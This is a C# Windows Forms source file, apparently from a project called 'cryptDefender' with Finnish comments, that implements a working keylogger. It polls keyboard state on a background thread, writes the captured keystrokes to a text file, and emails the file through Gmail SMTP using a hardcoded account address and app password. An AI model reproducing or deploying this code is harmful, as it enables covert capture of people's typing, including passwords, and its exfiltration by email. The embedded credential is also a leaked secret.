using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;


namespace cryptDefender
{
    public partial class keylogger : Form
    {
        private const int VK_BACK = 0x08;
        private const int VK_RETURN = 0x0D;
        private const int VK_SHIFT = 0x10;
        private const int VK_CAPITAL = 0x14;

        private StringBuilder logBuilder;
        private int durationMinutes = 1;
        private Thread loggingThread;

        private TextBox durationTextBox;
        private TextBox logPathTextBox;
        private Button logPathButton;
        private Button startButton;
        private TextBox emailTextBox;
        private Label emailLabel;
        private Label durationLabel;
        private CheckBox sendEmailCheckBox;
        private Label loggingStatusLabel;

        // tuodaan dll jotta voidaan seurata näppäimistön tilaa 
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        public keylogger()
        {
            InitializeComponent();
            logBuilder = new StringBuilder();


            EmailService.SetEmailCredentials("tähän_sähköposti", "tähän_salasana");
        }
        // click event joka aloittaa logituksen
        private void StartButton_Click(object sender, EventArgs e)
        {
            if (loggingThread == null || !loggingThread.IsAlive)
            {

                if (int.TryParse(durationTextBox.Text, out int duration))
                {
                    durationMinutes = duration;
                    StartLogging();
                }
                else
                {
                    MessageBox.Show("Please enter a valid duration in minutes.");
                }
            }
            else
            {
                MessageBox.Show("Logging is already running.");
            }
        }



        private void sendEmailCheckBox_CheckedChanged(object sender, EventArgs e)
        {

            bool isChecked = sendEmailCheckBox.Checked;


            MessageBox.Show(isChecked ? "Email will be sent." : "Email will not be sent.");
        }

        private void StartLogging()
        {
            loggingThread = new Thread(LogKeys);
            loggingThread.IsBackground = true;
            loggingThread.Start();

            loggingStatusLabel.Text = "Logging started...";
        }

        private void LogKeys()
        {
            TimeSpan duration = TimeSpan.FromMinutes(durationMinutes);
            DateTime startTime = DateTime.Now;
            // looppi näppäin painallusten tallentamiseen, ottaen huomioon myös erikois merkit
            while (DateTime.Now - startTime < duration)
            {
                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);

                    if (keyState == 1 || keyState == -32767)
                    {
                        string key = ((Keys)i).ToString();

                        if (key.Length == 1)
                        {

                            if (IsCapsLock())
                            {
                                if (!IsShiftPressed())
                                    key = key.ToUpper();
                                else
                                    key = key.ToLower();
                            }
                            else
                            {

                                if (IsShiftPressed())
                                    key = key.ToUpper();
                                else
                                    key = key.ToLower();
                            }

                            logBuilder.Append(key);
                        }
                        else if (key.Length > 1)
                        {
                            switch (key)
                            {
                                case "Space":
                                    logBuilder.Append("[space]");
                                    break;
                                case "Return":
                                    logBuilder.Append("[Enter]");
                                    break;
                                case "Back":
                                    logBuilder.Append("[Back]");
                                    break;
                                default:
                                    logBuilder.Append($"[{key}]");
                                    break;
                            }
                        }
                    }
                }

                Thread.Sleep(10);
            }


            SaveLogAndSendEmail(logBuilder.ToString());

            loggingStatusLabel.Invoke((MethodInvoker)delegate
            {
                loggingStatusLabel.Text = "Logging stopped";
            });

        }

        // tallennetaan logi ja luodaan sille txt tiedosto 
        private void SaveLogAndSendEmail(string log)
        {
            string filePath = logPathTextBox.Text;
            Directory.CreateDirectory(filePath);
            string fileName = $"keylog_{DateTime.Now.ToString("yyyyMMdd_HHmmss")}.txt";
            string fullPath = Path.Combine(filePath, fileName);
            File.WriteAllText(fullPath, log);
            MessageBox.Show($"Log saved to file: {fullPath}");


            EmailService.SendConfirmationEmail(emailTextBox.Text, fullPath);
        }

        private bool IsShiftPressed()
        {
            return (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        }

        private bool IsCapsLock()
        {
            return Control.IsKeyLocked(Keys.CapsLock);
        }
        // click eventti jossa valitaan haluttu tiedostopolku 
        private void logPathButton_Click(object sender, EventArgs e)
        {
            using (var folderDialog = new FolderBrowserDialog())
            {
                DialogResult result = folderDialog.ShowDialog();
                if (result == DialogResult.OK && !string.IsNullOrWhiteSpace(folderDialog.SelectedPath))
                {
                    logPathTextBox.Text = folderDialog.SelectedPath;
                }
            }
        }
    }

    public class EmailService
    {
        private const string SMTPServer = "smtp.gmail.com";
        private const int SMTPPort = 587;
        private static string SMTPUsername;
        private static string SMTPPassword;

        public static void SetEmailCredentials(string username, string password)
        {
            SMTPUsername = "cryptdefendertest@gmail.com";
            SMTPPassword = "muljpccommdkomcp";
        }

        public static void SendConfirmationEmail(string toEmail, string attachmentPath)
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient smtpServer = new SmtpClient(SMTPServer);

                mail.From = new MailAddress(SMTPUsername);
                mail.To.Add(toEmail);
                mail.Subject = "Keylogger Log File";
                mail.Body = "Attached is the keylogger log file.";


                Attachment attachment = new Attachment(attachmentPath);
                mail.Attachments.Add(attachment);

                smtpServer.Port = SMTPPort;
                smtpServer.Credentials = new NetworkCredential(SMTPUsername, SMTPPassword);
                smtpServer.EnableSsl = true;

                smtpServer.Send(mail);
                Console.WriteLine("Email sent successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error sending email: " + ex.Message);
            }
        }
    }
}
